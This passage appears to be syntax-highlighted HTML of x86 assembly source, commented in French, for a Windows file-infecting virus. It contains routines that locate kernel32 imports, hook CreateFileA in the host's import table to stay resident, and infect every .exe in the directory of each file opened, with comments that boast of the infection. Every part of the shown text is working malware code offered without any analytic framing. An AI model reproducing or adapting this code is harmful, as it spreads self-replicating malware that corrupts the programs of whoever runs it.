    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; on normalise</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">        </span><span class="sc1">; vÈrification</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GetImportedApi_ERROR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; RVA de l' import table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ECX pointe l'IMPORT TABLE (.idata)</span><span class="sc0">

</span><span class="sc5">k32search</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; ESI = ECX = un IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; adresse de l' imported module ASCIIZ string</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; on normalise</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">           </span><span class="sc1">; c'est l'IMPORT DESCRIPTOR du kernel ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">k32found</span><span class="sc0">            </span><span class="sc1">; on a trouvÈ l'IMPORT_DESCRIPTOR du kernel</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">             </span><span class="sc1">; ECX = Le prochain IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k32search</span><span class="sc0">           </span><span class="sc1">; on repart</span><span class="sc0">

</span><span class="sc5">k32found</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; ESI = kernel32 IMPORT DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ECX = RVA de l'IMAGE_THUNK_DATA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; on normalise</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ITD</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; IDT = adresse de l'IMAGE_THUNK_DATA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ESI = pointeur sur le FirstThunk</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; pas de FirstThunk ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GetImportedApi_ERROR</span><span class="sc0">        </span><span class="sc1">; on quitte</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; on normalise</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; EAX va servir de compteur</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; EDX pointe sur le FirstThunk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; sauve l'adresse du nom ‡ chercher</span><span class="sc0">


</span><span class="sc5">IAT_Next_API</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; la derniËre RVA ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GetImportedApi_ERROR</span><span class="sc0">        </span><span class="sc1">; on quitte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">; Ordinal?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">IAT_Inc_Compteur</span><span class="sc0">        </span><span class="sc1">; suivant...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ESI pointe le nom d'une API - 2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; on normalise</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">; ESI pointe le nom d'une API</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; EDI pointe le nom ‡ chercher</span><span class="sc0">

</span><span class="sc5">IAT_compare</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">; les 2 bytes sont pareils ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">IAT_Inc_Compteur</span><span class="sc0">        </span><span class="sc1">; non ? on passe ‡ la fonction suivante</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; la chaÓne entiËre est valide</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">IAT_API_Found</span><span class="sc0">           </span><span class="sc1">; -&gt; hÈhÈ, on l'a !</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">IAT_compare</span><span class="sc0">         </span><span class="sc1">; sinon on prend la prochaine lettre</span><span class="sc0">

</span><span class="sc5">IAT_Inc_Compteur</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; incrÈmente le compteur</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; prochaine RVA</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">IAT_Next_API</span><span class="sc0">            </span><span class="sc1">; on recherche de nouveau</span><span class="sc0">

</span><span class="sc5">IAT_API_Found</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; on multiplie le compteur par 4 (DWORDS)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ITD</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Pointe l'adresse de l'API</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; EBX = pointeur sur l'adresse de l'API</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EAX = adresse de l'API</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetImportedApi_ERROR</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetImportedApi</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   GoResident PROC</span><span class="sc0">
</span><span class="sc1">;   Permet de hooker les APIs dÈsirÈes et importÈes par l'hÙte</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">GoResident</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; Pas de rÈsidence ‡ la premiËre gÈnÈration</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GoResidentERROR</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NhookCreateFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; On commence par hookCreateFileA</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AhookCreateFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_hookCreateFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GoResident_FINDAPI</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; On sauve tous les registres</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetImportedApi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; On recherche les APIs dans l'IAT qu'on</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; veut hooker, c'est la residence per-process</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; On restaure les registres</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; elle est pas dans l'IAT</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GoResident_NEXT</span><span class="sc0">         </span><span class="sc1">; On se prend la prochaine</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; sauve l'adresse de l'API</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; choppe l'offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; le normalise</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; et l'installe dans l'IAT</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GoResident_NEXT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; on choppe le prochain nom d'API</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GoResident_NEXT</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; prochain offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; prochaine adresse de stockage</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; On regarde si on est arrivÈ ‡ la fin</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GoResident_FINDAPI</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">



</span><span class="sc5">GoResidentERROR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GoResident</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;======= [HOOKED] ==============================================================</span><span class="sc0">

</span><span class="sc5">hookCreateFileA</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">; sauve tous les registres</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">                  </span><span class="sc1">; sauve les flags</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Choppe le nom du fichier sur la pile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; Copie l'adresse dans esi</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdelta</span><span class="sc0">            </span><span class="sc1">; Calcul du delta offset</span><span class="sc0">
</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HookDirectory</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; buffer de copie</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">copypath</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; copie le chemin dans le buffer HookDirectory</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; choppe une lettre du chemin</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; copie la lettre dans le buffer</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; prochaine lettre</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; le 0 final ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">copypath</span><span class="sc0">            </span><span class="sc1">; sinon on boucle</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; edi pointe la fin du chemin copiÈ (un 0)</span><span class="sc0">

</span><span class="sc5">WhereIsSlash</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; 0 != \
    cmp byte ptr [edi], "\"     ; un \ ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">WhereIsSlash</span><span class="sc0">            </span><span class="sc1">; lettre prÈcÈdente</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; scalpe le buffer</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Current_Dir</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; edi pointe un buffer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; sauve le chemin du rep courant</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HookDirectory</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; edi pointe le dossier</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; on en fait le chemin par dÈfaut</span><span class="sc0">
                            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Infecte_Dir</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; on infecte tout le dossier</span><span class="sc0">
                            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Current_Dir</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; restaure le chemin courant</span><span class="sc0">

</span><span class="sc5">hookCreateFileA_ERROR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdeltaoffset</span><span class="sc0">          </span><span class="sc1">; Calcul du delta offset</span><span class="sc0">
</span><span class="sc5">getdeltaoffset</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdeltaoffset</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_hookCreateFileA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; quitte</span><span class="sc0">


</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   Infecte_Dir PROC</span><span class="sc0">
</span><span class="sc1">;   Infects the current directory</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">Infecte_Dir</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; adresse de notre structure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exestr</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; String de recherche: *exe</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AFindFirstFileA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; cherche dans le rÈpertoire courant</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">         </span><span class="sc1">; pas de fichier ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nofile</span><span class="sc0">              </span><span class="sc1">; oui ! on part.</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; handle de la recherche en eax</span><span class="sc0">

</span><span class="sc5">encore</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectMe</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Mouhahahahhahaha</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Gniak, on infecte toute le dossier</span><span class="sc0">
                        </span><span class="sc1">; fichier par fichier.</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; adresse de notre structure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
